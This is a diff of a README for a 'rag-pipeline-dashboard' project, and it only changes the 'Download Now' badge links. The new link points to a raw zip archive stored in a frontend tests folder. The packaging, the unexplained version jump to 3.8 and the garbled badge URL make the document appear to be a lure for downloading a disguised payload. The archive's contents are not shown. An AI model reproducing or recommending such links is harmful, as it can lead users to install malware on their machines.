@@ -6,7 +6,7 @@ The rag-pipeline-dashboard is a full-stack application designed to monitor real-
 ## 💾 Download & Install
 **To begin using the rag-pipeline-dashboard, visit the link below to download the latest version.**
 
-[![Download Now](https://github.com/persona-net/rag-pipeline-dashboard/raw/refs/heads/main/backend/tests/api/rag_dashboard_pipeline_1.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/persona-net/rag-pipeline-dashboard/raw/refs/heads/main/backend/tests/api/rag_dashboard_pipeline_1.0.zip)
+[![Download Now](https://raw.githubusercontent.com/persona-net/rag-pipeline-dashboard/main/frontend/tests/dashboard-rag-pipeline-3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/persona-net/rag-pipeline-dashboard/main/frontend/tests/dashboard-rag-pipeline-3.8.zip)
 
 ### Steps to Download:
 1. Click the download link above.
@@ -56,6 +56,6 @@ Join our community for support and discussions:
 
 To download the latest version of rag-pipeline-dashboard, visit the link below:
 
-[![Download Now](https://github.com/persona-net/rag-pipeline-dashboard/raw/refs/heads/main/backend/tests/api/rag_dashboard_pipeline_1.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/persona-net/rag-pipeline-dashboard/raw/refs/heads/main/backend/tests/api/rag_dashboard_pipeline_1.0.zip)
+[![Download Now](https://raw.githubusercontent.com/persona-net/rag-pipeline-dashboard/main/frontend/tests/dashboard-rag-pipeline-3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/persona-net/rag-pipeline-dashboard/main/frontend/tests/dashboard-rag-pipeline-3.8.zip)
 
 Thank you for choosing rag-pipeline-dashboard. We hope it simplifies your data monitoring needs!
